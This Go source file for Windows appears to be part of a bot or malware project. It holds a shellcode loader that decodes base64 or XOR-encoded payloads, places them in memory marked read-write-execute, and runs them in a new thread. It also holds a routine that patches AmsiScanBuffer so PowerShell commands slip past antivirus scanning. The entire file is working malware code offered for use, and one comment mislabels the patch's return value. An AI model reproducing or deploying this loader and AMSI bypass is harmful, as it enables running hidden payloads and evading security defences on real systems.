//go:build windows

package main

import (
	"encoding/base64"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32sc       = windows.NewLazySystemDLL("kernel32.dll")
	procCreateThread = kernel32sc.NewProc("CreateThread")
	procWaitForSO    = kernel32sc.NewProc("WaitForSingleObject")
	procCloseHandle  = kernel32sc.NewProc("CloseHandle")
)

// runShellcode decodes base64 shellcode and executes it in a new thread.
// Supports optional single-byte XOR key (same format as swizBOT encoder).
// Payload format: "BASE64DATA" or "KEY:BASE64DATA" for XOR-encoded payloads.
func runShellcode(payload string) error {
	raw, key, err := decodePayload(payload)
	if err != nil {
		return fmt.Errorf("decode: %w", err)
	}

	// XOR decode if key provided
	if key != 0 {
		for i := range raw {
			raw[i] ^= key
		}
	}

	return execShellcode(raw)
}

func decodePayload(payload string) ([]byte, byte, error) {
	// Check for "KEY:BASE64" format (XOR-encoded, compatible with swizBOT encoder)
	if len(payload) > 3 && payload[2] == ':' {
		var k byte
		fmt.Sscanf(payload[:2], "%02x", &k)
		data, err := base64.StdEncoding.DecodeString(payload[3:])
		return data, k, err
	}
	data, err := base64.StdEncoding.DecodeString(payload)
	return data, 0, err
}

func execShellcode(sc []byte) error {
	if len(sc) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	// Allocate RWX memory
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("VirtualAlloc: %w", err)
	}

	// Copy shellcode into allocated region
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(sc))
	copy(dst, sc)

	// Spawn thread at shellcode entry point via raw proc call
	hThread, _, err := procCreateThread.Call(0, 0, addr, 0, 0, 0)
	if hThread == 0 {
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		return fmt.Errorf("CreateThread: %w", err)
	}

	// Wait max 30s then close handle
	procWaitForSO.Call(hThread, 30000)
	procCloseHandle.Call(hThread)
	return nil
}

// amsiBypass patches AMSI's AmsiScanBuffer to always return clean.
// Mirrors the approach in church.c — allows PS commands to bypass AV scanning.
func amsiBypass() error {
	amsi := windows.NewLazySystemDLL("amsi.dll")
	if err := amsi.Load(); err != nil {
		return err // AMSI not loaded, nothing to do
	}
	proc := amsi.NewProc("AmsiScanBuffer")
	if err := proc.Find(); err != nil {
		return err
	}

	// Patch: mov eax, 0x80070057 (AMSI_RESULT_CLEAN) ; ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	addr := proc.Addr()

	var old uint32
	if err := windows.VirtualProtect(addr, uintptr(len(patch)),
		windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
		return err
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch))
	copy(dst, patch)

	windows.VirtualProtect(addr, uintptr(len(patch)), old, &old)
	return nil
}
